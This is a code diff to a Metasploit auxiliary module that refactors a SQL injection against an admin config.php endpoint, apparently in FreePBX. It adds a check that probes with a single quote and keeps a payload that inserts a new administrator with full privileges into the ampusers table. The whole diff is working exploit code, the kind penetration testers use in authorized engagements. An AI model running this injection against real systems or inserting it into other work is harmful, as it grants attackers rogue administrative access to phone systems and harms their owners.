@@ -40,6 +40,32 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
+  def sql_injection(payload)
+    send_request_cgi({
+      'uri' => normalize_uri('admin', 'config.php'),
+      'method' => 'POST',
+      'headers' => {
+        'Authorization' => basic_auth(datastore['USERNAME'], Rex::Text.rand_text_alphanumeric(6))
+      },
+      'vars_get' => {
+        'display' => 'endpoint',
+        'view' => 'customExt'
+      },
+      'vars_post' => {
+        'id' => payload
+      }
+    })
+  end
+
+  def check
+    res = sql_injection(%('))
+    if res&.code == 500
+      return Exploit::CheckCode::Vulnerable('Detected SQL injection with authentication bypass')
+    end
+
+    Exploit::CheckCode::Safe('No SQL injection detected, target is patched')
+  end
+
   def run
     username = datastore['NEW_USERNAME'] || Rex::Text.rand_text_alphanumeric(rand(4..10))
     password = datastore['NEW_PASSWORD'] || Rex::Text.rand_text_alphanumeric(rand(6..12))
@@ -81,21 +107,8 @@ class MetasploitModule < Msf::Auxiliary
     true
   end
 
-  def custom_extension_injection(username, password)
-    send_request_cgi({
-      'uri' => normalize_uri('admin', 'config.php'),
-      'method' => 'POST',
-      'headers' => {
-        'Authorization' => basic_auth(datastore['USERNAME'], Rex::Text.rand_text_alphanumeric(6))
-      },
-      'vars_get' => {
-        'display' => 'endpoint',
-        'view' => 'customExt'
-      },
-      'vars_post' => {
-        'id' => %<1';INSERT INTO ampusers (username, password_sha1, sections) VALUES ('#{username}', '#{password}', '*')#>
-      }
-    })
+  def custom_extension_injection(username, password_digest)
+    sql_injection(%<1';INSERT INTO ampusers (username, password_sha1, sections) VALUES ('#{username}', '#{password_digest}', '*')#>)
   end
 
 end
